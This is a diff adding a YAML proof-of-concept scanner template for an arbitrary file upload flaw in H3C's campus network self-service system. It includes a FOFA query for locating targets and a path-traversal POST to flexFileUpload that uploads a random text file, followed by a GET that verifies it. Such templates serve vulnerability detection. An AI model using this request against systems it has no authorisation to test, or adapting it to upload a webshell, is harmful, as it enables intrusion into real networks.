@@ -1,0 +1,39 @@
+id: poc-yaml-h3c-flexfileupload-file-upload
+info:
+  name: H3C-校园网自助服务系统flexfileupload任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: H3C-校园网自助服务系统
+  fofa: header="/selfservice"
+variables:
+  name: random_str(6)
+  content: random_str(16)
+requests:
+- method: POST
+  path: /imc/primepush/%2e%2e/flexFileUpload
+  headers:
+    Content-Type: multipart/form-data; boundary=---------------WebKitFormBoundaryMmx988TUuintqO4Q
+  data: '-----------------WebKitFormBoundaryMmx988TUuintqO4Q
+
+    Content-Disposition: form-data; name="{{.name}}.txt"; filename="{{.name}}.txt"
+
+    Content-Type: application/octet-stream
+
+    Content-Length: 255
+
+
+    {{.content}}
+
+    -----------------WebKitFormBoundaryMmx988TUuintqO4Q--
+
+    '
+  expression: 'status_code == 200 && contains(headers,"imc")
+
+    '
+- method: GET
+  path: /imc/primepush/%2e%2e/flex/topobg/{{.name}}.txt
+  expression: 'status_code == 200 && contains(body,content)
+
+    '
+transport: http
